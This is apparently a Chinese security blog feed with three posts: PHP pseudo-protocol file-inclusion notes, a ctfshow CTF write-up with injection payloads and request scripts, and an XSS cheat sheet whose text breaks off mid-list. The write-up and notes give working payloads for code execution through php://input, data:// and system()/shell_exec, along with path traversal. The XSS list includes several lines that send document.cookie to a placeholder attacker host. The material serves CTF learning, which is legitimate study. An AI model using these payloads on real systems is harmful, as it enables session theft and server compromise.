        <content type="html"><![CDATA[<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/224159.png" class=""><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>p:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file()、include()、highlight_file()和file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p><p>php:&#x2F;&#x2F;filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。</p><p><strong>协议参数</strong>：</p><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/120759.png" class=""><p><strong>过滤器</strong></p><p>这里只例举常用过滤器，详情请参考<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/123006.png" class=""><p>常用：</p><pre><code>1.php://filter/read=convert.base64-encode/resource=index.php2.php://filter/resource=index.php</code></pre><p>利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p><h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与<strong>包含函数</strong>结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>用法：</p><pre><code class="awk">data://text/plain,data://text/plain;base64,</code></pre><p>格式：data:资源类型(MIME类型);编码,内容</p><p>示例：</p><pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>data类型扩展</p><pre><code>data:,&lt;文本数据&gt;data:text/plain,&lt;文本数据&gt;data:text/html,&lt;HTML代码&gt;data:text/html;base64,&lt;base64编码的HTML代码&gt;data:text/css,&lt;CSS代码&gt;data:text/css;base64,&lt;base64编码的CSS代码&gt;data:text/javascript,&lt;Javascript代码&gt;data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;data:image/gif;base64,base64编码的gif图片数据data:image/png;base64,base64编码的png图片数据data:image/jpeg;base64,base64编码的jpeg图片数据data:image/x-icon;base64,base64编码的icon图片数据</code></pre><h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p>例如：</p><pre><code>http://127.0.0.1/cmd.php?cmd=php://inputPOST数据：&lt;?php phpinfo();?&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性(ctfshow)</title>
      <link href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"/>
      <url>/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>preg_match()只能处理字符串，当传入的是数组时将会返回false</p><p><strong>intval(mixed $value, int $base &#x3D; 10): int</strong></p><p>通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 <strong>intval()</strong> 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/155817.png" class=""><p>注：除非value是一个字符串，否则base不会起作用</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/155907.png" class=""><pre><code>payload:?num[]=1</code></pre><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>还是考察intval函数，看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/161305.png" class=""><pre><code>payload:?num=0x117c      #0x117c是4476的16进制</code></pre><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><p>先看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/213407.png" class=""><p>首先是：</p><p>if(preg_match(‘&#x2F;^php$&#x2F;im’, $a))</p><p>&#x2F;^php$&#x2F;im 表示用php匹配开头和结尾，不区分大小写，并且多行匹配</p><p>再次：</p><p>if(preg_match(‘&#x2F;^php$&#x2F;i’, $a))</p><p>与上面的区别是没有多行匹配，这可以用到Apache HTTPD换行解析漏洞（CVE-2017-15715）–(<a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a>)</p><pre><code>payload:?cmd=abc%0aphp</code></pre><p>a%0aphp，首先是preg_match中的$(匹配结尾)匹配a%0aphp中的换行符，这个时候会匹配到%0a（将%0a当作换行），那么a%0aphp后面的php因为preg_match函数有个&#x2F;m(匹配多行)就是单独的一行了，满足第一个if，要求行开始和结尾都是php</p><p>其次是第二个if，第二个if要求$a中开头和结尾没有php，而这个preg_match函数中没有&#x2F;m匹配多行，所以就直接匹配abc，abc不满足第二个if，所以输出flag</p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><p>还是考察intval()函数特性</p><pre><code>pyload:?cmd=4476.1</code></pre><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><p>这里过滤了a-z和A-Z，不能用16进制编码，但能用8进制编码，用小数也可以绕过。这里我们用8进制编码一下</p><pre><code>payload:?cmd=010574</code></pre><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><p>看源码</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/223456.png" class=""><p>这里增加了strpos()函数</p><p><strong>strpos(string $haystack, string $needle, int $offset &#x3D; 0): int|false</strong></p><p>返回 needle 在 haystack 中首次出现的数字位置。如果提供了$offset参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。</p><p>所以，这里的if(!strpos($num, “0”))是过滤了出现在字符串首位的0，即屏蔽了8进制</p><pre><code>payload:?num=4476.01</code></pre><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><p>这关直接过滤了点，发现用+号可以绕过</p><pre><code>payload:?cmd=+010574 或 ?cmd=%2b010574</code></pre><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><p>这里用相对路径</p><pre><code>payload:?u=./flag.php</code></pre><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><p>数组绕过</p><pre><code>POST a[]=1&amp;b[]=2</code></pre><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><p>由源码含义可构造payload:</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/110924.png" class=""><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113547.png" class=""><p><strong>in_array()</strong></p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113721.png" class=""><p><strong>file_put_contents()</strong></p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113902.png" class=""><p>直接构造，然后用蚁剑连接</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/115539.png" class=""><p>get数据可以多次尝试</p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><p>源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/142455.png" class=""><p><strong>is_numeric(mixed $value): bool</strong></p><p>检测指定的变量是否为数字或数字字符串。</p><p>这题的重点是and or和&amp;&amp; ||的区别，区别是优先级不同，后者的优先级高于&#x3D;，前者的优先级低于&#x3D;。所以这里只要构造v1等于一个数字即可。</p><pre><code>?v1=23&amp;v2=system(&#39;ls&#39;)&amp;v3=;?v1=1&amp;v2=system(&quot;tac ctfshow.php&quot;)&amp;v3=;?v1=1&amp;v2=highlight_file(&quot;ctfshow.php&quot;)&amp;v3=;?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><p>这一关几乎所有能用的都过滤了，这里要用到ReflectionClass反射类。</p><p>参考:<a href="https://www.php.net/manual/zh/class.reflectionclass.php">https://www.php.net/manual/zh/class.reflectionclass.php</a></p><p>​<a href="https://www.cnblogs.com/benbenhan/p/12572649.html">https://www.cnblogs.com/benbenhan/p/12572649.html</a></p><p>最简单的方法直接输出这个类即可，也就是构造出 echo new ReflectionClass(‘ctfshow’);</p><pre><code>payload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><p>先看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/162642.png" class=""><p><strong>call_user_func(callable $callback,mixed …$args):mixed</strong></p><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p><p>我们梳理一下这一关的思路：首先v3得是一个文件名，然后v2应该是一句话，但这里要绕过is_numeric()，并且要经过名为v1的函数转换，所以v2得是一句话经过处理成为纯数字，这里我们选v2&#x3D;’&lt;?&#x3D;<code>cat *</code>;’;,再经过base64和16进制编码后成为PD89YGNhdCAqYDs&#x3D;,等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，再转换为16进制，得到5044383959474e6864434171594473（注：如果此处使用bin2hex()函数，这个函数是先将字符串的ascii对应的二进制找出来，再将二进制码转换成16进制，所以如果用在线编码转换的话应先将字符串先base64编码，再用ascii转16进制）。</p><p>这一关要使用php:&#x2F;&#x2F;filter伪协议。</p><pre><code>payload:GET v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64- decode/resource=1.php         POST v1=hex2bin</code></pre><p>最后再访问1.php。</p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><p>同上</p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><pre><code>payload: GET v2=ddd         POST v1=ddd</code></pre><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/205755.png" class=""><p>考察变量覆盖，这里有个php的小特性就是变量不需要声明</p><pre><code>payload GET a=flag        POST error=a</code></pre><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><p>参考<a href="https://blog.csdn.net/qq_19980431/article/details/83018232">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p><pre><code>payload: GET v2[]=1         POST v1[]=2</code></pre><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><p><strong>parse_str(string $string, array &amp;$result): void</strong></p><p>如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 <code>result</code> 则会设置到该数组里 ）。</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/215655.png" class=""><pre><code>payload: GET v3=QNKCDZO         POST v1=flag=0</code></pre><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><p>考察ereg()截断漏洞.参考:<a href="https://blog.csdn.net/qq_25987491/article/details/79952393">https://blog.csdn.net/qq_25987491/article/details/79952393</a></p><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符大小写敏感</p><p>这里ereg有两个漏洞：<br>①%00截断及遇到%00则默认为字符串的结束<br>②当ntf为数组时它的返回值不是FALSE</p><p>数组绕过匹配:<br>第一步首先要过ereg，可以用%00截断<br>第二部0x36d是十进制877，逆操作经过strrev为778</p><pre><code>payload c=a%00778</code></pre><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><p>只要让new后面有个类不报错以后，就可以随意构造</p><pre><code>?v1=Exception();system(&quot;ls&quot;);//&amp;v2=a?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);//&amp;v2=a</code></pre><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><p>考察FilesystemIterator类</p><pre><code>payload ?v1=FilesystemIterator&amp;v2=getcwd</code></pre><p>缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。</p><p><strong>getcwd(): string|false</strong></p><p>取得当前工作目录。</p><p><strong>FilesystemIterator</strong> 遍历文件的类 </p><p><strong>DirctoryIntrerator</strong> 遍历目录的类</p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><p>这里用全局变量GLOBALS</p><p>$GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><p>注：在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。所以这里v2要用超全局变量GLOBALS,不能直接用flag。</p><pre><code>payload  ?v1=ctfshow&amp;v2=GLOBALS</code></pre><h5 id="使用超全局变量-GLOBALS可以代替global"><a href="#使用超全局变量-GLOBALS可以代替global" class="headerlink" title="使用超全局变量$GLOBALS可以代替global"></a>使用超全局变量$GLOBALS可以代替global</h5><pre><code>&lt;?php      $num1 = 5;      //全局变量     $num2 = 13;     //全局变量    function global_var()      &#123;              $sum = $GLOBALS[&#39;num1&#39;] + $GLOBALS[&#39;num2&#39;];              echo &quot;全局变量求和结果 &quot; .$sum;      &#125;      global_var();  ?&gt;  </code></pre><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><p><strong>is_file(string $filename): bool</strong></p><p>如果文件存在且为正常的文件则返回 true，否则返回 false。</p><p>这一关要传入一个不存在的文件名还要把文件内容显示出来，我们这里还是用php伪协议。</p><pre><code>payload ?file=php://filter/resource=flag.php</code></pre><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><p>这题用到伪协议zlib:&#x2F;&#x2F;</p><pre><code>payload ?file=compress.zlib://flag.php</code></pre><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><p>没有过滤php和filter</p><pre><code>?file=php://filter/resource=flag.php</code></pre><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/214923.png" class=""><p>这一关用%0c来绕过trim()函数</p><pre><code>payload ?num=%0c36</code></pre><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><p>这一关比较容易想出来fun&#x3D;echo $flag，但是没有回显，通过排查发现是$CTF_SHOW.COM的问题，看别人题解果然是，并且是因为是变量里有个点：</p><p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p><p>可以参考一下y4的博客<a href="https://blog.csdn.net/solitudi/article/details/120502141">https://blog.csdn.net/solitudi/article/details/120502141</a></p><p> (反正我也看不懂)，总之先记住这个性质。其实出现了[之后php就会去找]，如果找到了那就是数组，没有找到就被被解析成_</p><pre><code>payload CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></pre><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><p>这一关屏蔽了echo、flag。我们这里用创造一个新变量，巧妙利用highlight_file()</p><pre><code>payload CTF_SHOW=fds&amp;CTF[SHOW.COM=dfds&amp;fun=highlight_file($_POST[fff])&amp;fff=flag.php</code></pre><h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><p>直接过滤了g、i、f…，要利用$_SERVER[‘argv’]。</p><p><em>$_SERVER</em> 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p><p>‘argv’</p><p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p><p><strong>$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]</strong><br>query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据</p><p>可以用+来进行分隔，使得数组中有多个数值。</p><p>注：在web页模式下必须在php.ini开启register_argc_argv配置项</p><pre><code>payload GET a=1+$fl0g=flag_give_me;        POST CTF_SHOW=fds&amp;CTF[SHOW.COM=dfds&amp;fun=eval($a[1])</code></pre><p>注意分号。</p><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><p><strong>extract(array &amp;$array, int $flags &#x3D; EXTR_OVERWRITE, string $prefix&#x3D; “”): int</strong></p><p>本函数用来将变量从数组中导入到当前的符号表中。</p><p>array:一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量</p><p>这一关一直卡在CTF_SHOW的下划线的过滤上，看别人题解才发现还有个空格没用上</p><pre><code>payload ?ctf show=ilove36d</code></pre><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><p>这关操作确实有点骚。。。</p><p>复述一下大佬的做法：（做这道题的时候正好堆堆推门而入取水来了，不得让他表演一下。。。不过大佬就是大佬）</p><p>使用**gettext()**拓展，开启此拓展_() 等效于 gettext()</p><pre><code>echo _(&quot;hahahaha&quot;);//输出结果：hahahaha</code></pre><p>接下来到第二层call_user_func，可以使用get_defined_vars函数</p><p><strong>get_defined_vars ( void ) : array</strong> 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><pre><code>payload ?f1=_&amp;f2=get_defined_vars</code></pre><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><p>这题看到readfile第一反应是php伪协议，但要包括ctfshow，搞了一会不行，看别人题解发现放到过滤器参数里就可以，无效的东西会被忽略</p><pre><code>payload f=php://filter/ctfshow/resource=flag.php</code></pre><p>解法2：文件穿越，把ctfshow当作当前目录下的一个文件</p><pre><code>?f=/ctfshow/../../../../../../../../../var/www/html/flag.php</code></pre><h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><p>第一下随便传了个f&#x3D;ctfshow想试试代码中的正则是什么作用，结果爆出了flag。。。</p><p>.表示任意单个字符，+表示必须匹配1次或多次，？表示匹配0次或1次·，所以+?表示 重复1次或更多次</p><pre><code>payload f=ctfshow</code></pre><p>还有一种做法：通过数组来绕过，stripos应用于数组的时候会返回null，null!&#x3D;&#x3D;false</p><pre><code>payload f[]=1</code></pre><p>其实这道题的意图是通过回溯限制来绕过。</p><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false</p><p>脚本发包：</p><pre><code class="python">import requestsurl = &quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;data = &#123;    &#39;f&#39;: &#39;dotast&#39;*170000+&#39;ctfshow&#39;&#125;res = requests.post(url=url,data=data)print(res.text)</code></pre><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><p>这一关只能用回溯了</p><pre><code class="python">import requestsurl = &quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;data = &#123;    &#39;f&#39;: &#39;dotast&#39;*170000+&#39;36Dctfshow&#39;&#125;res = requests.post(url=url,data=data)print(res.text)</code></pre><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>进入admin目录</p><p>&amp;&amp;优先级高于||，所以</p><pre><code>paylaod ?username=admin&amp;code=admin&amp;password=fdsf</code></pre><h3 id="web133"><a href="#web133" class="headerlink" title="***web133"></a>***web133</h3><p>这题看看出题人的博客 <a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p><pre><code>我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令**那为什么会这样？**因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是``$F`;+sleep 3`,就执行成功这里可能有点绕，慢慢理解</code></pre><p><strong>shell_exec</strong> — 通过 shell 执行命令并将完整的输出以字符串的方式返回</p><p>所以这里没办法回显</p><p>这一关要弹什么shell，以后再看</p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><p><strong>parse_str(string $string, array &amp;$result): void</strong></p><p>如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。（parse_str以&amp;来分割字符串）</p><pre><code>payload ?_POST[key1]=36d&amp;_POST[key2]=36d</code></pre><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><p>这一关屏蔽了很多东西，我们用linux命令cp或uniq</p><pre><code>payload ?F=`$F` ;cp flag.php 2.txt;         ?F=`$F` ;uniq flag.php&gt;4.txt;</code></pre><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><p><strong>exec(string $command, array &amp;$output &#x3D; null, int &amp;$result_code&#x3D; null): string|false</strong></p><p>exec()执行 command 参数所指定的命令。</p><p>这关屏蔽了&lt;&gt;和.，又来一个新姿势：</p><pre><code>tee a.txt b.txt，将a.txt复制到b.txt ls | tee b.txt,将ls命令的执行结果写入b.txt</code></pre><p>先执行?c&#x3D;ls &#x2F;|tee ls,然后访问ls.txt</p><p>会让你下载文件，</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/135803.png" class=""><p>然后执行 ?c&#x3D;tac &#x2F;f149_15_h3r3|tee flag，访问&#x2F;flag</p><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><p>用**call_user_func()**来调用一个类里面的方法</p><pre><code>payload ctfshow=ctfshow::getFlag</code></pre><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><p>屏蔽了冒号，还可以用数组来调用类里的方法</p><pre><code>payload ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></pre><h3 id="web139"><a href="#web139" class="headerlink" title="***web139"></a>***web139</h3><p>要用到什么shell编程和盲注，还是暂放亿下。。。</p><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><p>“ctfshow”字符串与数字比较时被转换为0，所以这关随便胡写俩个函数使最后的结果为null就行</p><pre><code>payload f1=intval&amp;f2=intval</code></pre><h3 id="web141"><a href="#web141" class="headerlink" title="***web141"></a>***web141</h3><p>\W匹配非字母、数字、下划线。等价于 [^A-Za-z0-9_]。</p><p>无数字字母rce……</p><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><p>这关没难度</p><pre><code>payload v1=0</code></pre><h3 id="web143-150"><a href="#web143-150" class="headerlink" title="***web143-150"></a>***web143-150</h3>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss</title>
      <link href="/2023/03/28/xss/"/>
      <url>/2023/03/28/xss/</url>
      
        <content type="html"><![CDATA[<p>xss类型：</p><p>​反射型</p><p>​存储型</p><p>​DOM型（document.write、innerHTML、eval）</p><p>注：document.write可以识别Native编码</p><p>同源策略：同协议，同域名，同端口</p><pre><code>标签法：&lt;script&gt;alert(123)&lt;/script&gt;伪协议：&lt;a href=javascript:alert(555)&gt;&lt;/a&gt;事件法：&lt;a onmousemove=alert(888)&gt;8888&lt;a&gt;</code></pre><h3 id="无过滤情况"><a href="#无过滤情况" class="headerlink" title="无过滤情况"></a>无过滤情况</h3><p>&lt;script&gt;</p><pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;script&gt;var img=document.createElement(&quot;img&quot;); img.src=&quot;http://xxx.xxx:xxxx/&quot;+document.cookie&lt;/script&gt;  //外带&lt;script&gt;window.open(&quot;http://xxx.xxx:xxxx/&quot;+document.cookie)&lt;/script&gt;&lt;script&gt;window.location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;&lt;script&gt;location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;</code></pre><p>&lt;img&gt;</p><pre><code>图片加载错误时触发&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;鼠标指针移动到元素时触发&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;鼠标指针移出时触发&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;a&gt;</p><pre><code>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;&lt;a href=javascript:alert(&#39;xss&#39;)&gt;test&lt;/a&gt;&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;a&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(alert(&#39;xss&#39;))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#39;xss&#39;) y=2016&gt;aa&lt;/a&gt;</code></pre><p>&lt;input&gt;</p><pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;竞争焦点，从而触发onblur事件&lt;input onfocus=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot; autofocus&gt; //外带&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;按下按键时触发&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;按下按键时触发&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;松开按键式时触发&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;from&gt;</p><pre><code>&lt;form action=javascript:alert(&#39;xss&#39;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&#39;xss&#39;)&gt;&lt;form method=post action=aa.asp? onmouseover=prompt(&#39;xss&#39;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&#39;xss&#39;)&gt;&lt;form action=1 onmouseover=alert(&#39;xss)&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p>&lt;iframe&gt;</p><pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt; //外带&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#39;xss&#39;) /&gt;&lt;iframe&gt;&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````只有两个``)</code></pre><p>&lt;svg&gt;</p><pre><code>&lt;svg onload=alert(1)&gt;&lt;svg onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;</code></pre><p>&lt;body&gt;</p><pre><code>&lt;body onload=&quot;alert(1)&quot;&gt;&lt;body onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt; //外带利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发&lt;body 